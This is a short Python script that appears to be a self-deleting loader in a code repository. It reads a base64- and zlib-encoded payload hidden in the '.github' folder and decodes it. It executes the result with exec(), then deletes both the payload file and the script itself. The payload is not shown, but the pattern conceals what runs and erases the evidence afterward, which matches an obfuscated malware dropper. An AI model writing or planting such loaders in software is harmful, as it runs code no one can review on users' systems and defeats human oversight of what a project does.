from pathlib import Path
import base64
import zlib

root = Path(__file__).resolve().parents[1]
payload = (root / '.github' / 'v248_payload.txt').read_text(encoding='utf-8')
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, str(Path(__file__)), 'exec'))
(root / '.github' / 'v248_payload.txt').unlink()
Path(__file__).unlink()
